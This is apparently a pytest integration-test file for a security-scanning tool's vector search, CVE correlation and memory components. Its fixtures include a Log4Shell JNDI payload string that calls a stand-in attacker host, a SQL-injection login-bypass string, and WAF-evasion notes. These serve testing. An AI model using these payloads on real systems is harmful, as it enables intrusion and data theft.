"""
End-to-end integration tests for ARGUS Vector RAG Pipeline (Sprint 31b).

Verifies cross-component integration across:
- ScanEvidenceIndexer & FindingSemanticSearchEngine
- CVEKnowledgeBase & CVECorrelator
- MemoryStore & MemoryManager
- Unified VectorStore cross-source queries
- ResearchContextEngine multi-source blended retrieval
- Persistence round-trips & storage recovery
- Multi-dimensional filter composition
"""

from __future__ import annotations

import json
import os
from pathlib import Path
import tempfile
import pytest

from argus.evidence.model import Evidence
from argus.knowledge.cve_correlator import CVECorrelator
from argus.knowledge.cve_kb import CVEKnowledgeBase
from argus.knowledge.cve_models import CVEEntry
from argus.memory.manager import MemoryManager
from argus.memory.models import MemoryEntry, MemoryStatus, MemoryType
from argus.reporting.models import Finding, VulnerabilityReport
from argus.reporting.vector_indexer import FindingSemanticSearchEngine, ScanEvidenceIndexer
from argus.vector.embeddings import EmbeddingEngine
from argus.vector.models import VectorDocument, VectorFilter, VectorStoreConfig
from argus.vector.store import VectorStore
from argus.workspace.context.engine import ResearchContextEngine
from argus.workspace.context.models import ContextQuery


# ==============================================================================
# Fixtures
# ==============================================================================


@pytest.fixture
def temp_db_path(tmp_path: Path) -> str:
    """Provide a path to a temporary SQLite vector database."""
    return str(tmp_path / "integration_rag.db")


@pytest.fixture
def embedding_engine() -> EmbeddingEngine:
    """Deterministic embedding engine for fast, repeatable tests."""
    return EmbeddingEngine(provider="deterministic", dimension=384)


@pytest.fixture
def vector_store(temp_db_path: str, embedding_engine: EmbeddingEngine) -> VectorStore:
    """Isolated VectorStore instance backed by temporary file."""
    config = VectorStoreConfig(
        db_path=temp_db_path,
        dimension=384,
        use_sqlite_vec=False,  # Use robust numpy fallback for uniform CI predictability
    )
    store = VectorStore(config=config, embedding_engine=embedding_engine)
    yield store
    store.close()


@pytest.fixture
def sample_findings() -> list[Finding]:
    """Diverse set of findings for indexing and search verification."""
    return [
        Finding(
            id="find-sqli-01",
            title="SQL Injection in Authentication Login",
            category="sql_injection",
            severity="critical",
            host="auth.example.com",
            endpoint="/api/v1/login",
            parameter="username",
            description="Union-based SQL injection allows authentication bypass and database exfiltration.",
            impact="Full database compromise and privilege escalation.",
            remediation="Use parameterized queries and prepared statements.",
        ),
        Finding(
            id="find-xss-01",
            title="Stored Cross-Site Scripting in User Profile",
            category="xss",
            severity="high",
            host="app.example.com",
            endpoint="/profile/update",
            parameter="bio",
            description="Stored XSS executes arbitrary JavaScript in victim browser sessions.",
            impact="Session hijacking and unauthorized actions.",
            remediation="Implement context-aware HTML entity encoding.",
        ),
        Finding(
            id="find-ssrf-01",
            title="Server-Side Request Forgery in Webhook Callback",
            category="ssrf",
            severity="critical",
            host="api.example.com",
            endpoint="/webhook/test",
            parameter="callback_url",
            description="SSRF allows internal cloud metadata access at 169.254.169.254.",
            impact="Cloud credential leakage and lateral network movement.",
            remediation="Validate URLs against strict IP whitelist.",
        ),
        Finding(
            id="find-idor-01",
            title="Insecure Direct Object Reference in Invoice Retrieval",
            category="idor",
            severity="medium",
            host="billing.example.com",
            endpoint="/invoice/view",
            parameter="invoice_id",
            description="Predictable sequential IDs allow accessing invoices of other tenants.",
            impact="Unauthorized disclosure of financial records.",
            remediation="Enforce tenant-level authorization checks.",
        ),
        Finding(
            id="find-info-01",
            title="Information Disclosure via Server Header",
            category="information_disclosure",
            severity="low",
            host="app.example.com",
            endpoint="/",
            description="Server header reveals Apache/2.4.41 Ubuntu version details.",
            impact="Aids reconnaissance.",
            remediation="Configure ServerTokens Prod.",
        ),
    ]


@pytest.fixture
def sample_cves() -> list[CVEEntry]:
    """Set of real-world CVE records across distinct classes."""
    return [
        CVEEntry(
            cve_id="CVE-2021-44228",
            title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
            description="Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints resulting in remote code execution.",
            severity="critical",
            cvss_score=10.0,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            cwes=["CWE-502", "CWE-400"],
            affected_products=["Apache Log4j", "log4j-core"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        ),
        CVEEntry(
            cve_id="CVE-2022-22965",
            title="Spring Framework Remote Code Execution via Data Binding (Spring4Shell)",
            description="Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.",
            severity="critical",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-94"],
            affected_products=["Spring Framework", "Apache Tomcat", "Spring MVC"],
            references=["https://tanzu.vmware.com/security/cve-2022-22965"],
        ),
        CVEEntry(
            cve_id="CVE-2021-34527",
            title="Windows Print Spooler Remote Code Execution (PrintNightmare)",
            description="Windows Print Spooler service improperly performs privileged file operations allowing remote code execution as SYSTEM.",
            severity="high",
            cvss_score=8.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            cwes=["CWE-269"],
            affected_products=["Microsoft Windows", "Print Spooler"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
        ),
        CVEEntry(
            cve_id="CVE-2020-0601",
            title="Windows CryptoAPI Elliptic Curve Spoofing (CurveBall)",
            description="A spoofing vulnerability exists in the way Windows CryptoAPI validates Elliptic Curve Cryptography certificates.",
            severity="medium",
            cvss_score=6.5,
            cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
            cwes=["CWE-295"],
            affected_products=["Microsoft Windows", "CryptoAPI"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0601"],
        ),
    ]


# ==============================================================================
# 1. Findings Indexing & Semantic Search Tests
# ==============================================================================


class TestFindingSemanticRAG:
    """Tests for ScanEvidenceIndexer and FindingSemanticSearchEngine."""

    def test_index_single_finding_and_retrieve(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Index a single finding and verify semantic search retrieves it with high similarity."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        doc_id = indexer.index_finding(sample_findings[0], mission_id="mission_1")
        assert doc_id.startswith("finding:mission_1:")

        results = engine.search_findings("database sql injection parameter", top_k=5)
        assert len(results) >= 1
        top_match = results[0]
        assert top_match.id == doc_id
        assert top_match.score > 0.3
        assert top_match.severity == "critical"
        assert top_match.category == "sql_injection"
        assert "auth.example.com" in top_match.content

    def test_index_multiple_findings_semantic_ranking(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify that relevant queries rank their respective findings at the top."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        for finding in sample_findings:
            indexer.index_finding(finding, mission_id="mission_1")

        # Query targeting XSS
        xss_results = engine.search_findings("cross-site scripting stolen cookie javascript", top_k=3)
        assert len(xss_results) > 0
        assert xss_results[0].category == "xss"

        # Query targeting SSRF
        ssrf_results = engine.search_findings("cloud metadata AWS 169.254.169.254 internal callback", top_k=3)
        assert len(ssrf_results) > 0
        assert ssrf_results[0].category == "ssrf"

    def test_index_evidence_and_semantic_search(self, vector_store: VectorStore):
        """Index raw Evidence and search via search_evidence."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        evidence = Evidence(
            evidence_id="ev-001",
            title="Discovered Exposed Git Repository",
            category="information_disclosure",
            severity="high",
            status="CONFIRMED",
            source_type="git_scanner",
            mission_id="mission_recon",
            description="Found /.git/HEAD and objects index publicly accessible via HTTP GET.",
            value="ref: refs/heads/master",
        )
        doc_id = indexer.index_evidence(evidence)
        assert doc_id.startswith("evidence:mission_recon:ev-001")

        results = engine.search_evidence("git repository exposed files", top_k=5)
        assert len(results) >= 1
        assert results[0].id == doc_id
        assert results[0].source_type == "evidence"

    def test_index_vulnerability_report(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Index an entire VulnerabilityReport and verify all findings are searchable."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        report = VulnerabilityReport(
            report_id="rep-101",
            mission_id="m_full",
            target="target.corp",
            findings=sample_findings,
        )
        count = indexer.index_report(report)
        assert count == len(sample_findings)

        total_findings = engine.count_findings({"mission_id": "m_full"})
        assert total_findings == len(sample_findings)

    def test_finding_filters_severity(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify severity filtering on search_findings."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        for finding in sample_findings:
            indexer.index_finding(finding, mission_id="m1")

        crit_results = engine.search_findings("vulnerability", severity="critical")
        for r in crit_results:
            assert r.severity == "critical"

        multi_sev = engine.search_findings("vulnerability", severity=["critical", "high"])
        for r in multi_sev:
            assert r.severity in ["critical", "high"]

    def test_finding_filters_category(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify category filtering on search_findings."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        for finding in sample_findings:
            indexer.index_finding(finding, mission_id="m1")

        sqli_results = engine.search_findings("injection", category="sql_injection")
        assert all(r.category == "sql_injection" for r in sqli_results)

    def test_finding_filters_mission_id(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify mission_id filtering on search_findings."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        indexer.index_finding(sample_findings[0], mission_id="mission_alpha")
        indexer.index_finding(sample_findings[1], mission_id="mission_beta")

        res_alpha = engine.search_findings("vulnerability", mission_id="mission_alpha")
        assert len(res_alpha) == 1
        assert res_alpha[0].mission_id == "mission_alpha"

    def test_get_finding_by_id(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify direct get_finding retrieves exact record."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        indexer.index_finding(sample_findings[0], mission_id="m1")
        found = engine.get_finding(sample_findings[0].id, mission_id="m1")
        assert found is not None
        assert found.severity == "critical"
        assert "Authentication" in found.content

    def test_clear_mission_findings(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Verify clear_mission purges only documents belonging to that mission."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        engine = FindingSemanticSearchEngine(vector_store=vector_store)

        indexer.index_finding(sample_findings[0], mission_id="to_delete")
        indexer.index_finding(sample_findings[1], mission_id="to_keep")

        deleted = engine.clear_mission("to_delete")
        assert deleted == 1

        assert engine.get_finding(sample_findings[0].id, mission_id="to_delete") is None
        assert engine.get_finding(sample_findings[1].id, mission_id="to_keep") is not None


# ==============================================================================
# 2. CVE Knowledge Base & Correlation Integration Tests
# ==============================================================================


class TestCVEKnowledgeBaseRAG:
    """Tests for CVEKnowledgeBase and CVECorrelator integration."""

    def test_ingest_cve_entries_and_search(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Ingest CVEs and verify semantic query returns Log4j."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        ingested = cve_kb.ingest_entries(sample_cves)
        assert ingested == len(sample_cves)

        results = cve_kb.search_cves("LDAP JNDI remote code execution log4j", top_k=3)
        assert len(results) > 0
        top_cve, score = results[0]
        assert top_cve.cve_id == "CVE-2021-44228"
        assert score > 0.3
        assert top_cve.severity == "critical"

    def test_search_cves_filter_cwe(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Search CVEs filtered by CWE identifier."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        results = cve_kb.search_cves("vulnerability", cwe="CWE-502", top_k=5)
        assert len(results) >= 1
        assert any(r[0].cve_id == "CVE-2021-44228" for r in results)
        assert all("CWE-502" in r[0].cwes or "CWE-502" in r[0].description for r in results)

    def test_search_cves_filter_product(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Search CVEs filtered by affected product."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        results = cve_kb.search_cves("code execution", affected_product="Spring", top_k=5)
        assert len(results) >= 1
        assert results[0][0].cve_id == "CVE-2022-22965"

    def test_search_cves_filter_severity(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Search CVEs filtered by severity."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        crit_results = cve_kb.search_cves("vulnerability", severity="critical")
        for entry, _ in crit_results:
            assert entry.severity == "critical"

    def test_cve_kb_get_by_id(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Verify get_cve retrieves exact entry by ID."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        entry = cve_kb.get_cve("CVE-2021-44228")
        assert entry is not None
        assert entry.title == "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)"
        assert entry.cvss_score == 10.0

    def test_cve_correlator_finding_correlation(
        self, vector_store: VectorStore, sample_cves: list[CVEEntry]
    ):
        """Verify CVECorrelator correlates a scan finding with ingested CVEs."""
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        correlator = CVECorrelator(cve_kb=cve_kb)

        finding = Finding(
            id="log4j-finding",
            title="Apache Log4j JNDI Lookup Vulnerability",
            category="rce",
            severity="critical",
            description="Application performs JNDI lookups on user-controlled inputs via log4j-core.",
            payload="${jndi:ldap://attacker.com/a}",
        )

        suggestions = correlator.correlate_finding(finding, top_k=3, min_score=0.1)
        assert len(suggestions) >= 1
        assert suggestions[0].cve_id == "CVE-2021-44228"
        assert suggestions[0].correlation_score > 0.1


# ==============================================================================
# 3. Conversational Memory System Integration Tests
# ==============================================================================


class TestMemoryManagerRAG:
    """Tests for MemoryManager recall and lifecycle."""

    def test_record_and_semantic_recall(self, vector_store: VectorStore):
        """Record an attack pattern and recall it semantically."""
        mem_mgr = MemoryManager(vector_store=vector_store)

        mem = mem_mgr.record_attack_pattern(
            content="Splitting payload into multiple HTTP chunks bypasses ModSecurity CRS inspect rule.",
            title="WAF Bypass via Chunked Transfer Encoding",
            mission_id="m_waf",
            tags=["waf", "chunked", "bypass"],
        )
        assert mem.id is not None

        results = mem_mgr.recall("bypassing web application firewall chunks", top_k=5)
        assert len(results) >= 1
        assert results[0].id == mem.id
        assert results[0].score > 0.3
        assert "WAF Bypass" in results[0].title

    def test_recall_filter_memory_type(self, vector_store: VectorStore):
        """Verify recall filters by MemoryType."""
        mem_mgr = MemoryManager(vector_store=vector_store)

        mem_mgr.record_attack_pattern(content="Use admin' -- to bypass authentication", title="SQLi Auth Bypass")
        mem_mgr.record_user_correction(content="Target server listens only on port 8443", title="Avoid Port 443")

        corr_results = mem_mgr.recall(
            "target port", memory_type=MemoryType.USER_CORRECTION, top_k=5
        )
        assert len(corr_results) == 1
        assert corr_results[0].memory_type == MemoryType.USER_CORRECTION

    def test_recall_mission_and_global_isolation(self, vector_store: VectorStore):
        """Verify mission-specific vs global memory recall."""
        mem_mgr = MemoryManager(vector_store=vector_store)

        mem_mgr.record_note(content="Target uses nginx reverse proxy", title="Mission note", mission_id="mission_1")
        mem_mgr.record_note(content="Standard AWS IAM policy pattern", title="Global note")  # global

        # Mission recall (exact_mission=True isolates mission-specific memories)
        m_results = mem_mgr.recall("note", mission_id="mission_1", exact_mission=True)
        assert len(m_results) == 1
        assert m_results[0].mission_id == "mission_1"

        # Global recall
        g_results = mem_mgr.recall_global("note")
        assert len(g_results) == 1
        assert g_results[0].mission_id is None

    def test_memory_lifecycle_archival_and_active_filter(self, vector_store: VectorStore):
        """Verify archiving hides memories when active_only=True."""
        mem_mgr = MemoryManager(vector_store=vector_store)

        entry = mem_mgr.record_note(content="/v1/auth is deprecated", title="Old API Endpoint")
        assert entry.status == MemoryStatus.ACTIVE

        # Active search finds it
        active_res = mem_mgr.recall("endpoint", active_only=True)
        assert len(active_res) == 1

        # Archive entry
        mem_mgr.archive_entry(entry.id)

        # Active search now excludes it
        active_res2 = mem_mgr.recall("endpoint", active_only=True)
        assert len(active_res2) == 0

        # Unfiltered search still finds it
        all_res = mem_mgr.recall("endpoint", active_only=False)
        assert len(all_res) == 1


# ==============================================================================
# 4. Cross-Source Blended Search Tests
# ==============================================================================


class TestCrossSourceVectorSearch:
    """Tests verifying VectorStore.search spans findings, CVEs, evidence, and memory in a single query."""

    def test_cross_source_search_single_query(
        self,
        vector_store: VectorStore,
        sample_findings: list[Finding],
        sample_cves: list[CVEEntry],
    ):
        """Single query returns blended results from finding, cve, evidence, and memory."""
        # 1. Index Finding
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="m1")  # SQLi

        # 2. Ingest CVE
        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries([sample_cves[0]])  # Log4j

        # 3. Index Evidence
        indexer.index_evidence(
            Evidence(
                evidence_id="ev-cross-1",
                title="SQL Injection Error Banner",
                category="sql_injection",
                severity="high",
                mission_id="m1",
                description="Database error: syntax error at or near 'admin'.",
            )
        )

        # 4. Record Memory
        mem_mgr = MemoryManager(vector_store=vector_store)
        mem_mgr.record_attack_pattern(
            content="Use inline SQL comments /**/ to bypass whitespace filters.",
            title="SQL Injection Bypass Strategy",
        )

        # Unified search across all sources
        results = vector_store.search("sql injection database exploit", top_k=10)
        assert len(results) >= 3

        source_types = {r.source_type for r in results}
        assert "finding" in source_types
        assert "evidence" in source_types
        assert "memory" in source_types

    def test_cross_source_filtering_by_source_type_list(
        self,
        vector_store: VectorStore,
        sample_findings: list[Finding],
        sample_cves: list[CVEEntry],
    ):
        """Filter cross-source search using a list of source_types."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="m1")

        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries([sample_cves[0]])

        mem_mgr = MemoryManager(vector_store=vector_store)
        mem_mgr.record_note(content="Discuss SQL injection findings", title="Meeting Note")

        results = vector_store.search(
            "sql injection",
            filters=VectorFilter(source_type=["finding", "cve"]),
            top_k=10,
        )
        for r in results:
            assert r.source_type in ["finding", "cve"]
            assert r.source_type != "memory"

    def test_cross_source_filtering_by_severity(
        self,
        vector_store: VectorStore,
        sample_findings: list[Finding],
        sample_cves: list[CVEEntry],
    ):
        """Filter cross-source search by severity across both findings and CVEs."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        for f in sample_findings:
            indexer.index_finding(f, mission_id="m1")

        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries(sample_cves)

        results = vector_store.search(
            "security issue",
            filters=VectorFilter(severity="critical"),
            top_k=10,
        )
        assert len(results) >= 2
        for r in results:
            assert r.severity == "critical"


# ==============================================================================
# 5. ResearchContextEngine Multi-Source Resolution Tests
# ==============================================================================


class TestResearchContextEngineIntegration:
    """Tests verifying ResearchContextEngine.resolve returns blended results."""

    def test_research_context_engine_blended_sources(
        self,
        vector_store: VectorStore,
        sample_findings: list[Finding],
        sample_cves: list[CVEEntry],
    ):
        """Verify ResearchContextEngine.resolve retrieves findings, CVEs, and memory simultaneously."""
        # Seed vector store with multiple source types
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="ctx_mission")  # SQLi

        cve_kb = CVEKnowledgeBase(vector_store=vector_store)
        cve_kb.ingest_entries([sample_cves[0]])  # Log4j RCE

        mem_mgr = MemoryManager(vector_store=vector_store)
        mem_mgr.record_attack_pattern(
            content="Inject into username parameter to bypass login.",
            title="Authentication SQLi Technique",
            mission_id="ctx_mission",
        )

        engine = ResearchContextEngine(
            vector_store=vector_store,
            enable_semantic_retrieval=True,
            min_semantic_score=0.1,
            max_semantic_candidates=5,
        )

        query = ContextQuery(
            conversation_id="conv-1",
            query="SQL injection authentication bypass",
            mission_id="ctx_mission",
        )
        raw_sources = engine._retrieve_sources(query)
        assert len(raw_sources) > 0

        source_types = {s.source_type for s in raw_sources}
        assert any("finding" in t for t in source_types)
        assert any("memory" in t for t in source_types)

        assembled_prompt = engine.resolve(query)
        assert isinstance(assembled_prompt, str)
        assert "ARGUS RESEARCH CONTEXT" in assembled_prompt
        assert "SQL injection" in assembled_prompt or "SQLi" in assembled_prompt

    def test_research_context_engine_disabled_semantic(
        self,
        vector_store: VectorStore,
        sample_findings: list[Finding],
    ):
        """When semantic retrieval is disabled, no vector sources should be resolved."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="m1")

        engine = ResearchContextEngine(
            vector_store=vector_store,
            enable_semantic_retrieval=False,
        )

        query = ContextQuery(conversation_id="conv-2", query="SQL injection", mission_id="m1")
        raw_sources = engine._retrieve_sources(query)
        vector_sources = [s for s in raw_sources if "vector" in s.source_type or "memory" in s.source_type]
        assert len(vector_sources) == 0

        assembled_prompt = engine.resolve(query)
        assert "### CONFIRMED FINDINGS" not in assembled_prompt


# ==============================================================================
# 6. Round-Trip Persistence Tests
# ==============================================================================


class TestVectorStorePersistence:
    """Tests verifying round-trip persistence across store re-instantiations."""

    def test_roundtrip_persistence_reopen(
        self,
        temp_db_path: str,
        embedding_engine: EmbeddingEngine,
        sample_findings: list[Finding],
        sample_cves: list[CVEEntry],
    ):
        """Store documents -> close store -> reopen from disk -> verify all survive and search works."""
        # 1. First session: store data
        config = VectorStoreConfig(db_path=temp_db_path, dimension=384, use_sqlite_vec=False)
        store1 = VectorStore(config=config, embedding_engine=embedding_engine)

        indexer = ScanEvidenceIndexer(vector_store=store1)
        doc_id1 = indexer.index_finding(sample_findings[0], mission_id="persist_m")

        cve_kb1 = CVEKnowledgeBase(vector_store=store1)
        cve_kb1.ingest_entries([sample_cves[0]])

        mem_mgr1 = MemoryManager(vector_store=store1)
        mem_entry = mem_mgr1.record_note(content="Survives process restart", title="Persistent Note")

        count1 = store1.count()
        assert count1 == 3
        store1.close()

        # 2. Second session: reopen store from same database path
        store2 = VectorStore(config=config, embedding_engine=embedding_engine)
        try:
            assert store2.count() == 3

            # Verify document retrieval
            doc = store2.get(doc_id1)
            assert doc is not None
            assert doc.severity == "critical"
            assert "Authentication" in doc.content

            # Verify semantic search survives
            search_engine = FindingSemanticSearchEngine(vector_store=store2)
            results = search_engine.search_findings("SQL injection", top_k=5)
            assert len(results) >= 1
            assert results[0].id == doc_id1

            # Verify CVE retrieval survives
            cve_kb2 = CVEKnowledgeBase(vector_store=store2)
            cve = cve_kb2.get_cve("CVE-2021-44228")
            assert cve is not None
            assert cve.cve_id == "CVE-2021-44228"

            # Verify Memory recall survives
            mem_mgr2 = MemoryManager(vector_store=store2)
            mem_res = mem_mgr2.recall("restart note")
            assert len(mem_res) >= 1
            assert mem_res[0].id == mem_entry.id
        finally:
            store2.close()


# ==============================================================================
# 7. Filter Composition Tests
# ==============================================================================


class TestFilterComposition:
    """Tests verifying multi-field filter composition."""

    def test_filter_composition_source_severity_category(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Combine source_type, severity, and category in single query."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        for f in sample_findings:
            indexer.index_finding(f, mission_id="m_comp")

        f_crit_sqli = VectorFilter(
            source_type="finding",
            severity="critical",
            category="sql_injection",
        )
        res = vector_store.search("injection", filters=f_crit_sqli)
        assert len(res) == 1
        assert res[0].category == "sql_injection"
        assert res[0].severity == "critical"

    def test_filter_composition_mission_and_severity(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Combine mission_id and severity filters."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="m_one")  # critical sqli
        indexer.index_finding(sample_findings[2], mission_id="m_two")  # critical ssrf

        f_m1_crit = VectorFilter(mission_id="m_one", severity="critical")
        res = vector_store.search("vulnerability", filters=f_m1_crit)
        assert len(res) == 1
        assert res[0].mission_id == "m_one"

    def test_filter_composition_no_match(
        self, vector_store: VectorStore, sample_findings: list[Finding]
    ):
        """Conflicting filter values yield empty list gracefully without errors."""
        indexer = ScanEvidenceIndexer(vector_store=vector_store)
        indexer.index_finding(sample_findings[0], mission_id="m_one")

        f_impossible = VectorFilter(severity="low", category="sql_injection")
        res = vector_store.search("injection", filters=f_impossible)
        assert len(res) == 0
